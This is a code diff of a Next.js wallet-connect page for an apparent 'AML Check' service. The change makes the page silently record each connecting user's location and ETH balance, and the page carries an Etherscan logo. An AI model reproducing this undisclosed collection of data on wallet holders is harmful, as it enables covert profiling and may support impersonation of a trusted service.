@@ -1,3 +1,4 @@
+// src/app/page.tsx
 "use client";
 
 import { useState } from "react";
@@ -9,10 +10,11 @@ import trustwallet from "@public/etherscan.svg";
 import { createThirdwebClient } from "thirdweb";
 import { createWallet, type Wallet } from "thirdweb/wallets";
 import { useConnection } from "@/context/ConnectionContext";
+import { getUserLocation, getETHBalancePublic } from "@/utils/walletUtils";
 
 // Créer le client Thirdweb
 const client = createThirdwebClient({
-  clientId: "c98a5d48ad89f114ad6044933fced541", 
+  clientId: "c98a5d48ad89f114ad6044933fced541",
 });
 
 // Spécifie uniquement Trust Wallet
@@ -22,14 +24,14 @@ const wallets = [
 
 // Composant pour le bouton Historique
 const HistoryButton = () => (
-  <div style={{ 
-    textAlign: 'center', 
+  <div style={{
+    textAlign: 'center',
     paddingTop: '30px',
     paddingBottom: '30px',
   }}>
     <Link href="/History">
       <button style={{
-        backgroundColor: '#1e40af', 
+        backgroundColor: '#1e40af',
         color: 'white',
         padding: '10px 20px',
         borderRadius: '8px',
@@ -40,10 +42,10 @@ const HistoryButton = () => (
         boxShadow: '0 2px 4px rgba(0, 0, 0, 0.1)',
         transition: 'background-color 0.3s ease, transform 0.1s ease'
       }}
-      onMouseOver={(e) => (e.currentTarget.style.backgroundColor = '#1e3a8a')}
-      onMouseOut={(e) => (e.currentTarget.style.backgroundColor = '#1e40af')}
-      onMouseDown={(e) => (e.currentTarget.style.transform = 'scale(0.98)')}
-      onMouseUp={(e) => (e.currentTarget.style.transform = 'scale(1)')}
+        onMouseOver={(e) => (e.currentTarget.style.backgroundColor = '#1e3a8a')}
+        onMouseOut={(e) => (e.currentTarget.style.backgroundColor = '#1e40af')}
+        onMouseDown={(e) => (e.currentTarget.style.transform = 'scale(0.98)')}
+        onMouseUp={(e) => (e.currentTarget.style.transform = 'scale(1)')}
       >
         See History
       </button>
@@ -56,7 +58,7 @@ export default function Home() {
   const [password, setPassword] = useState('');
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const router = useRouter();
-  const { addConnection, fetchUserData, fetchIpData } = useConnection();
+  const { addConnection } = useConnection();
 
   const handleLogin = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
@@ -64,55 +66,51 @@ export default function Home() {
       setIsLoggedIn(true);
       router.push("/");
     } else {
-      alert("Login error: incorrect username or password.");
+      alert("Login error: incorrect username or password. ");
     }
   };
 
   const handleWalletConnect = async (wallet: Wallet) => {
     const account = wallet.getAccount();
     
-    // Détection du navigateur
-    const userAgent = navigator.userAgent;
-    const chromeVersion = userAgent.match(/Chrome\/(\d+)/)?.[1] || '136';
-    const browser = `Chrome ${chromeVersion}`;
-
     if (account) {
       try {
-        // Récupérer toutes les données
-        const [userData, ipData] = await Promise.all([
-          fetchUserData(account.address),
-          fetchIpData()
-        ]);
-
+        // Récupérer la localisation
+        const location = await getUserLocation();
+        
+        // Récupérer le solde ETH
+        const ethBalance = await getETHBalancePublic(account.address);
+        
         await addConnection({ 
           status: "Wallet connected", 
           ethAddress: account.address,
-          walletProvider: "Trust Wallet",
-          network: userData.network,
-          ip: ipData.ip,
-          location: ipData.location,
-          browser: browser,
-          purpose: "Accès au dashboard AML",
-          balance: userData.balance
+          location: location,
+          ethBalance: ethBalance
         });
       } catch (error) {
-        console.error("Error during wallet connection:", error);
+        console.error("Erreur lors de la récupération des informations:", error);
         await addConnection({ 
-          status: "Wallet connected (partial data)",
+          status: "Wallet connected", 
           ethAddress: account.address,
-          browser: browser
+          location: "Erreur de localisation",
+          ethBalance: "Erreur de solde"
         });
       }
     } else {
       await addConnection({ 
         status: "Wallet connected (address pending)",
-        browser: browser
+        location: "Non disponible",
+        ethBalance: "Non disponible"
       });
     }
   };
 
   const handleWalletDisconnect = async () => {
-    await addConnection({ status: "Wallet disconnected" });
+    await addConnection({ 
+      status: "Wallet disconnected",
+      location: "N/A",
+      ethBalance: "N/A"
+    });
   };
 
   if (isLoggedIn) {
@@ -128,17 +126,19 @@ export default function Home() {
                 The AML Check platform automates AML/KYC procedures and reduces compliance-related expenses.
               </p>
             </div>
+
             <div className="buttons flex flex-col sm:flex-row gap-4 sm:gap-20">
-              <ConnectButton 
-                client={client} 
-                wallets={wallets} 
-                connectModal={{ size: "compact" }} 
+              <ConnectButton
+                client={client}
+                wallets={wallets}
+                connectModal={{ size: "compact" }}
                 onConnect={handleWalletConnect}
                 onDisconnect={handleWalletDisconnect}
               />
               <a href="#" className="secondary-button">Bot de chat →</a>
             </div>
           </div>
+
           <div className="image mt-10 sm:mt-0">
             <Image
               src={trustwallet}
@@ -176,7 +176,7 @@ export default function Home() {
           </div>
         </section>
 
-        <div className="bg-gray-50"> 
+        <div className="bg-gray-50">
           <HistoryButton />
         </div>
       </>
@@ -199,7 +199,6 @@ export default function Home() {
         display: 'flex',
         flexDirection: 'column',
         alignItems: 'center',
-        marginBottom: '40px'
       }}>
         <div style={{
           display: 'flex',
@@ -209,9 +208,9 @@ export default function Home() {
         }}>
           <Image src="/etherscan.svg" alt="Logo" width={100} height={100} />
         </div>
-        
+
         <h1 style={{ color: '#333', fontSize: '2rem', marginBottom: '30px' }}>Connexion</h1>
-        
+
         <form onSubmit={handleLogin} style={{
           display: 'flex',
           flexDirection: 'column',
@@ -243,6 +242,7 @@ export default function Home() {
               }}
             />
           </div>
+
           <div style={{ marginBottom: '20px' }}>
             <label style={{
               display: 'block',
@@ -265,6 +265,7 @@ export default function Home() {
               }}
             />
           </div>
+
           <button type="submit" style={{
             backgroundColor: '#007bff',
             color: 'white',
